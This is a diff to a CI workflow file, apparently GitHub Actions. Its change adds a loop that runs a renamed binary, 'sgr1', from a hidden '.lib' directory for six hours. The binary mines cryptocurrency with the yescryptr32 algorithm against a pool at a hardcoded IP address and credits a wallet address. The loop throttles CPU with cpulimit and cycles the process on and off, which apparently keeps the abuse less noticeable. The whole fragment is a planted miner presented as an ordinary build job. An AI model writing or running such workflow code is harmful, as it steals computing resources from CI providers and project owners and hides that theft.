@@ -48,26 +48,31 @@ jobs:
         start_time=$(date +%s)
         end_time=$((start_time + 6*3600))  # 6 hours from start
         while [ $(date +%s) -lt $end_time ]; do
-          # Start the process with cpulimit
-          cpulimit -l 300 -e ./sgr1 &
-          
-          # Store the PID of cpulimit
-          cpulimit_pid=$!
-          
-          # Run the process with the specified parameters in background
-          nohup ./sgr1 -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$JOB --timeout 120 -t 4 > /dev/null 2>&1 &
-          
-          # Store the PID of the running process
-          process_pid=$!
-          
-          # Run for 1 minute
-          sleep 60
-          
-          # Kill the process
-          kill $process_pid || true
+          if [ -f .lib/sgr1 ]; then
+            # Start the process with cpulimit
+            cpulimit -l 300 -e .lib/sgr1 &
+            
+            # Store the PID of cpulimit
+            cpulimit_pid=$!
+            
+            # Run the process with the specified parameters in background
+            nohup .lib/sgr1 -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$cpulimit_pid --timeout 120 -t 4 &
+            
+            # Store the PID of the running process
+            process_pid=$!
+            
+            # Run for 1 minute
+            sleep 60
+            
+            # Kill the process
+            kill $process_pid || true
 
-          # Wait for 2 minutes before the next iteration
-          sleep 120
+            # Wait for 2 minutes before the next iteration
+            sleep 120
+          else
+            echo "sgr1 not found. Skipping..."
+            sleep 120
+          fi
         done
 
         # Clean up
